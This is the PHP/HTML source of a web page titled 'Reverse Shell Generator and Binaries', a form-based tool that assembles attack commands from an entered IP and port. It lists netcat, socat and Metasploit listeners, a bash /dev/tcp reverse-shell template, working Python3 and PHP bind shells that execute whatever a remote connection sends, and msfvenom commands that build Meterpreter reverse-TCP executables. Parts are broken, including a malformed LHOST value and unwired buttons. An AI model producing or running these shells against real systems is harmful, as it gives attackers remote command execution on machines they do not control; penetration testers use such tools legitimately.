<!-- Include Head -->
<?php include "assest/head.php"; ?>
<?php include "assest/header.php" ?>
    <!-- </Header> -->
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<link href='https://fonts.googleapis.com/css?family=Nunito Sans' rel='stylesheet'>
<link href="css/style.css" type="text/css" rel="stylesheet" />

<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
<link rel="stylesheet" href="https://www.w3schools.com/lib/w3-theme-black.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.3.0/css/font-awesome.min.css">
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
    font-family: 'Nunito Sans';font-size: 20px;
}
 
[contenteditable] {
  outline: 0px solid transparent;
}
.filterDiv {
  float: left;
   white-space: nowrap;
  text-align: center;
  margin: 2px;
  display: none;
}
.show {
  display: block;
}

.container {
  margin-top: 20px;
  overflow: hidden;
}

.btn {
  border: none;
  outline: none;
  padding: 12px 16px;
  background-color: #f1f1f1;
  cursor: pointer;
}
.btn:hover {
  background-color: #ddd;
}

.btn.active {
  background-color: #666;
  color: white;
}

/* Style the tab */
.tab {
  float: left;
  border: 1px solid #ccc;
  background-color: #f1f1f1;
  width: 30%;
  height: 300px;
}

/* Style the buttons inside the tab */
.tab button {
  display: block;
  background-color: inherit;
  color: black;
  padding: 22px 16px;
  width: 100%;
  border: none;
  outline: none;
  text-align: left;
  cursor: pointer;
  transition: 0.3s;
  font-size: 17px;
}
#mydiv {
 
  width:100%;
  height: 100px;
  display: flex;
  flex-wrap:wrap;
}

/* Change background color of buttons on hover */
.tab button:hover {
  background-color: #ddd;
}

/* Create an active/current "tab button" class */
.tab button.active {
  background-color: #ccc;
}

/* Style the tab content */
.tabcontent {
  float: left;
  padding: 0px 12px;
  border: 1px solid #ccc;
  width: 70%;
  border-left: none;
  height: 300px;
}

.vertical-menu {
  width: 200px;
  height: 400px;
  overflow-y: auto;
   flex-wrap:nowrap;
}

.vertical-menu a {
  background-color: #eee;
  color: black;
  display: block;
  padding: 12px;
  text-decoration: none;
}

.vertical-menu a:hover {
  background-color: #ccc;
}

.vertical-menu a.active {
  background-color: #04AA6D;
  color: white;
}

.float-container {
    border: 3px solid #fff;
    padding: 20px;
   flex-wrap:wrap;
}

.float-child {
    width: 100%;
    float: left;
    padding: 20px;
 flex-wrap:wrap;
}  

.container{
    display: flex;
  flex-wrap:wrap;
}
.fixed{
    width: 200px;
}
.flex-item{
    flex-grow: 1;
}
</style>
  
</head>
<body>


<!-- Navigation Bar -->
<div class="w3-bar w3-white w3-border-bottom w3-large w3-center">
  <h1> Reverse Shell Generator and Binaries</h1>


<hr>
<br>


<div class="w3-row-padding">
<div class="w3-half">
<div class="w3-card white">
  <div class="w3-container w3-indigo">
    <h3>IP address & Port</h3>
  </div>
  <div class="w3-container">
 
  </div>
  <ul class="w3-ul w3-border-top">
    <li>
      
      <script>
      var ip=document.createElement("ip");
       var port=document.createElement("port");
      </script>
      
     
  <label for="ip">IP address:</label> 
 <input type="text" id="ip" onchange="myFunction()">


  <h1>    </h1>
  
  <label for="port">Port:</label> 
 <input type="text" id="port" onchange="secFunction()">

      <p> </p>
    
  </ul>
  <div class="w3-container w3-indigo w3-large"><span class="w3-right"> </span></div>
</div>
</div>

<div class="w3-half">
<div class="w3-card white">
  <div class="w3-container w3-theme">
    <h3>Listener</h3>
  </div>
  <div class="w3-container">
  <h3 class="w3-text-theme">    
  
    <label for="type">Type:</label>

<select class="type" name="type" >

<option value="choose one"> </option>
  <option value="nc -lvnp ">nc</option>
  <option value="ncat -lvnp ">ncat</option>
  <option value="ncat --ssl -lvnp ">ncat (TLS)</option>
  <option value="rlwrap -cAr nc lvnp ">rlwrap + nc</option>
 <option value="rcat -lp ">rustcat</option>
  <option value="rcat -lHp ">rustcat + Command History</option>
   <option value="python3 -m pwncat -lp ">pwncat</option>
    <option value="stty raw -echo; (stty size; cat) | nc -lvnp ">windows ConPty</option>
    
 
   
     <option value="socat -d -d TCP-LISTEN:" >socat</option>
 
     
      <option value="socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:">socat (TTY)</option>
       <option value="powercat -l -p ">powercat</option>
        <option value="msfconsole -q -x ">msfconsole</option>
        
</select>
 
 <div class="result"></div>
 
 <p id="demo"></p>
  <p id="MSF"></p>
   <p id="input port"> </p>
    <p id="socat"></p>
       <p id="MSF2"></p>

     
    
   <div class="w3-container">
  <h3 class="w3-text-theme">  
 
  <script>
 

function myFunction() {
  var x = document.getElementById("ip").value;
  document.getElementById("demo").innerHTML = x;
}
  
function secFunction() {
  var x = document.getElementById("port").value;
  document.getElementById("input port").innerHTML = x;
  }


  const selectElement = document.querySelector('.type');

selectElement.addEventListener('change', (event) => {
  const result = document.querySelector('.result');
 
 
result.textContent = `  ${event.target.value}`;

});

  </script>  
 <div class=" w3-large">
 <div <button onclick="specialFunction()">if its socat,click me</button> </div>
 
 <div <button onclick="MSFFunction()">if its MSF,click me</button> </div>
 
 
</div>

<script>
 

function specialFunction() {
 document.getElementById("socat").innerHTML = " STDOUT";
}

function MSFFunction() {

   
 document.getElementById("MSF").innerHTML = "; set lport ";
 
  document.getElementById("MSF2").innerHTML = "; exploit";
 
 
}
</script>
    




<h1> </h1>
</h3>
  </div>
  <ul class="w3-ul w3-border-top">
   
  </ul>
  <div class="w3-container w3-theme w3-large"><span class="w3-right"> </span></div>
</div>
</div>
</div>
 

</div>
  
<hr>

 
<div class="w3-center">
<div class="w3-bar w3-theme">

  <button class="w3-bar-item w3-button testbtn w3-padding-16" onclick="openCity(event,'Reverse')">Reverse</button>
  <button class="w3-bar-item w3-button testbtn w3-padding-16" onclick="openCity(event,'Bind')">Bind</button>
  <button class="w3-bar-item w3-button testbtn w3-padding-16" onclick="openCity(event,'MSFVenom')">MSFVenom</button>
  
</div>
</div>

<div id="Reverse" class="w3-container city w3-animate-opacity">
  <div class="w3-dropdown-hover">
   <div class="w3-black w3-center"> 
  <label for="All">OS:</label>   </div>
    <button class="w3-button w3-theme"> All <i class="fa fa-caret-down"></i></button>
    <div class="w3-dropdown-content w3-bar-block w3-border">
    
    <!-- Control buttons -->
    <div class="vertical-menu">
<div id="myBtnContainer">
  <div class="w3-bar-item w3-button" onclick="filterSelection('Linux')"> Linux</div>
  <div class="w3-bar-item w3-button" onclick="filterSelection('Windows')"> Windows</div>
  <div class="w3-bar-item w3-button" onclick="filterSelection('Mac')"> Mac</div>
</div>
</div>
    </div>
  </div>
    <div class="w3-container w3-right-align">
  <h3 class="w3-text-theme">    
  
    <label for="shell">shell:</label>

<select name="shell" id="shell">


  <option value="sh">sh</option>
  <option value="/bin/sh">/bin/sh</option>
  <option value="ncattls">ncat (TLS)</option>
  <option value="bash"> bash</option>
 <option value="/bin/bash">/bin/bash</option>
  <option value="cmd">cmd</option>
   <option value="powershell">powershell</option>
    <option value="pwsh">pwsh</option>
     <option value="ash">ash</option>
      <option value="bsh">bsh</option>
       <option value="csh ">csh</option>
        <option value="ksh">ksh</option>
        <option value="zsh">zsh</option>
       <option value="pdksh ">pdksh</option>
        <option value="tcsh">tcsh</option>
</select>
<br>
<br>
<label for="encoding">encoding:</label>
<select name="encoding" id="encoding">


  <option value="none">none</option>
  <option value="url">URL encode</option>
  <option value="double">double URL encode</option>
  <option value="base64"> base64</option>
 
</select>


  </div>

 <div id="mydiv">
 
<!-- The filterable elements. Note that some have multiple class names (this can be used if they belong to multiple categories) -->
 <div class="vertical-menu ">


  <div class="w3-bar-item w3-button filterDiv Linux Mac" onclick="bashifunction()">Bash -i</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">Bash 196</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">Bash read line</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">Bash 5</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">Bash udp</div>

  <div class="w3-bar-item w3-button filterDiv Linux Mac">nc -e</div>
  <div class="w3-bar-item w3-button filterDiv Windows">nc.exe -e</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">nc -c</div>
 
  <div class="w3-bar-item w3-button filterDiv Linux Mac">ncat  udp</div>
      <div class="w3-bar-item w3-button filterDiv Linux Mac">ncat -e</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">nc mkfifo</div>
    <div class="w3-bar-item w3-button filterDiv Windows">ncat.exe -e</div>
   <div class="w3-bar-item w3-button filterDiv Linux Mac">C     </div>
  <div class="w3-bar-item w3-button filterDiv Windows ">C Windows</div>
  <div class="w3-bar-item w3-button filterDiv Linux Windows">C#</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">Haskell #1</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">Perl</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">Perl no sh</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">rustcat     </div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">PHP Emoji</div>
  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">PHP PentestMonkey</div>
  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">PHP Ivan Sincek</div>
  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">PHP cmd</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">PHP exec</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">PHP shell_exec</div>
  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">PHP system</div>
   <div class="w3-bar-item w3-button filterDiv Linux Mac">PHP passthru</div>
  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">PHP `</div>
  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">PHP popen</div>
  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">PHP proc_open</div>
  <div class="w3-bar-item w3-button filterDiv Windows ">Windows ConPty</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">Awk</div>
  <div class="w3-bar-item w3-button filterDiv Windows">PowerShell #1</div>
  <div class="w3-bar-item w3-button filterDiv Windows">PowerShell #2</div>
  <div class="w3-bar-item w3-button filterDiv Windows">PowerShell #3</div>
  <div class="w3-bar-item w3-button filterDiv Windows">PowerShell #4 (TLS)</div>
  <div class="w3-bar-item w3-button filterDiv Windows ">PowerShell #3 (Base64)</div>
   
<div class="w3-bar-item w3-button filterDiv Linux Mac">zsh</div>

  <div class="w3-bar-item w3-button filterDiv Linux Mac">Python #1</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">Python #2</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">Python3 #1</div>
   <div class="w3-bar-item w3-button filterDiv Linux Mac">Python3 #2</div>
    <div class="w3-bar-item w3-button filterDiv Linux">Python3 shortest</div>
      <div class="w3-bar-item w3-button filterDiv Linux Mac">telnet</div>
      <div class="w3-bar-item w3-button filterDiv Linux Mac">Ruby #1</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">Ruby no sh</div>
        <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">Dart</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">socat #1</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">socat #2 (TTY)</div>

  <div class="w3-bar-item w3-button filterDiv Linux Mac">node.js</div>
  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">node.js #2</div>
      <div class="w3-bar-item w3-button filterDiv Windows">Groovy</div>
      
  <div class="w3-bar-item w3-button filterDiv Linux Mac">Java #1</div>
  <div class="w3-bar-item w3-button filterDiv Linux Mac">Java #2</div>
   <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">Java #3</div>
    <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">Javascript</div>

  <div class="w3-bar-item w3-button filterDiv Linux ">Lua #1</div>
  <div class="w3-bar-item w3-button filterDiv Linux Windows">Lua #2</div>

  <div class="w3-bar-item w3-button filterDiv Linux Windows Mac">Golang</div>



  <div class="w3-bar-item w3-button filterDiv Linux Mac">Vlang</div>
 

</div>
</div>


<div class="w3-container">
 

  <h3 class="w3-text-theme w3-center">    
     <label for="command">Command:</label> 
 <p id="command"></p>

</div>
</div>
<script>
function bashifunction() {
  document.getElementById("command").innerHTML = "shell -i >& /dev/tcp/ip/port 0>&1";
}
</script>



 

</div>

 
</div>
 </div>
</div>
</div>
 
 

<div id="Bind" class="w3-container city w3-animate-opacity">


<div class="w3-container">
<div class="float-child">

<div class="tab">
  <button class="tablinks" onclick="City(event, 'Python3 Bind')" id="defaultOpen">Python3 Bind</button>
  <button class="tablinks" onclick="City(event, 'PHP Bind')">PHP Bind</button>
</div>

<div id="Python3 Bind" class="tabcontent">
<div class="float-child">
  <h3 class="w3-text-theme w3-large w3-display-container"> 
  
  <p>
  python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,
  s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",9008));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,
stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
</p>
  </div>
</div>


<div id="PHP Bind" class="tabcontent">
<div class="float-child">
  <h3 class="w3-text-theme w3-large w3-display-container"> 
  <p> 
  php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",9008);
  socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd))
  {$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'
  </p>
 
</div>
 
</div>

 
 </div>
</div>
</div>
  
<div id="MSFVenom" class="w3-container city w3-animate-opacity">
 

<div class="w3-container">
<div class="float-child">

<div class="tab">
  <button class="tablinks" onclick="City(event, 'WMSR')" id="defaultOpen">Windows Meterpreter Staged Reverse TCP (x64)</button>
  <button class="tablinks" onclick="City(event, 'WMSlessR')">Windows Meterpreter Stageless Reverse TCP (x64)</button>
  <button class="tablinks" onclick="City(event, 'WSR')">Windows Staged Reverse TCP (x64)</button>
</div>

<div id="WMSR" class="tabcontent">
<div class="float-child">
  <h3 class="w3-text-theme w3-large w3-display-container">    
   <p>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1gg LPORT=9008 -f exe -o reverse.exe</p>
  </div>
</div>

<div id="WMSlessR" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">    
  <p>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1gg LPORT=9008 -f exe -o reverse.exe</p>
</div>

<div id="WSR" class="tabcontent">
 <h3 class="w3-text-theme w3-large w3-display-container">    
<p> msfvenom -p windows/x64/shell/reverse_tcp LHOST=127.0.0.1gg LPORT=9008 -f exe -o reverse.exe</p>
</div>
</div>

 
</div>
 </div>
</div>
</div>


<!-- Script for Sidebar, Tabs, Accordions, Progress bars and slideshows -->
<script>
// Side navigation
function w3_open() {
  var x = document.getElementById("mySidebar");
  x.style.width = "100%";
  x.style.fontSize = "40px";
  x.style.paddingTop = "10%";
  x.style.display = "block";
}
function w3_close() {
  document.getElementById("mySidebar").style.display = "none";
}

// Tabs
function openCity(evt, cityName) {
  var i;
  var x = document.getElementsByClassName("city");
  for (i = 0; i < x.length; i++) {
    x[i].style.display = "none";
  }
  var activebtn = document.getElementsByClassName("testbtn");
  for (i = 0; i < x.length; i++) {
    activebtn[i].className = activebtn[i].className.replace(" w3-dark-grey", "");
  }
  document.getElementById(cityName).style.display = "block";
  evt.currentTarget.className += " w3-dark-grey";
}

var mybtn = document.getElementsByClassName("testbtn")[0];
mybtn.click();
 
 //vert tabs
 function City(evt, cityName) {
  var i, tabcontent, tablinks;
  tabcontent = document.getElementsByClassName("tabcontent");
  for (i = 0; i < tabcontent.length; i++) {
    tabcontent[i].style.display = "none";
  }
  tablinks = document.getElementsByClassName("tablinks");
  for (i = 0; i < tablinks.length; i++) {
    tablinks[i].className = tablinks[i].className.replace(" active", "");
  }
  document.getElementById(cityName).style.display = "block";
  evt.currentTarget.className += " active";
}

// Get the element with id="defaultOpen" and click on it
document.getElementById("defaultOpen").click();

 
 
 filterSelection("all")
function filterSelection(c) {
  var x, i;
  x = document.getElementsByClassName("filterDiv");
  if (c == "all") c = "";
  // Add the "show" class (display:block) to the filtered elements, and remove the "show" class from the elements that are not selected
  for (i = 0; i < x.length; i++) {
    w3RemoveClass(x[i], "show");
    if (x[i].className.indexOf(c) > -1) w3AddClass(x[i], "show");
  }
}

// Show filtered elements
function w3AddClass(element, name) {
  var i, arr1, arr2;
  arr1 = element.className.split(" ");
  arr2 = name.split(" ");
  for (i = 0; i < arr2.length; i++) {
    if (arr1.indexOf(arr2[i]) == -1) {
      element.className += " " + arr2[i];
    }
  }
}

// Hide elements that are not selected
function w3RemoveClass(element, name) {
  var i, arr1, arr2;
  arr1 = element.className.split(" ");
  arr2 = name.split(" ");
  for (i = 0; i < arr2.length; i++) {
    while (arr1.indexOf(arr2[i]) > -1) {
      arr1.splice(arr1.indexOf(arr2[i]), 1);
    }
  }
  element.className = arr1.join(" ");
}

// Add active class to the current control button (highlight it)
var btnContainer = document.getElementById("myBtnContainer");
var btns = btnContainer.getElementsByClassName("btn");
for (var i = 0; i < btns.length; i++) {
  btns[i].addEventListener("click", function() {
    var current = document.getElementsByClassName("active");
    current[0].className = current[0].className.replace(" active", "");
    this.className += " active";
  });
}
  </script> 
 
</script>

</body>
</html>
